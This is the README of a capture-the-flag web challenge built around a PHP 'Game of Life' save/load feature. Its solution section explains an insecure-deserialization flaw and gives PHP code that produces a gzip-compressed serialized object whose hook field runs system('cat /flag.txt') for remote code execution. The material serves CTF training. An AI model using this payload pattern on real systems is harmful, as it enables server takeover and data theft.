# Game of Life

A CTFd compatible docker image for a web challenge. Scenario:

Having fun hacking and want a break? Why not play a little game? The Game of Life is a fun diversion you can use to simulate all sorts of interesting cellular structures. Maybe you'll find something else...

## Setup

Run the included build-docker.sh script to build and deploy the container in docker.

## Solution

The system is PHP-based and has a save and load functionality that encodes the save data in a PHP object, serializes it, and then compressed it with gzip compression. Once players examine this and discover the compression type then they will recognize that it may be vulnerable to insecure deserialization. There is a comment in the downloaded save file under the variable "hook" which says "//todo - add php callback hooks", indicating that it expects php code to be there.

By making their own evil GOLSave PHP object with php code embedded in the hook field, and then compressing it, players can achieve RCE on the server and get the flag at /flag.txt


### Solution Code

The code below generates an evil save file that allows for code execution on the server.

```php

<?php

class GOLSave {
    private $hook = "system('cat /flag.txt'); exit();";
    private $board = array();
}

$save = new GOLSave();
$compressed = gzcompress(serialize($save));

file_put_contents("evil.golsave",$compressed);

?>
```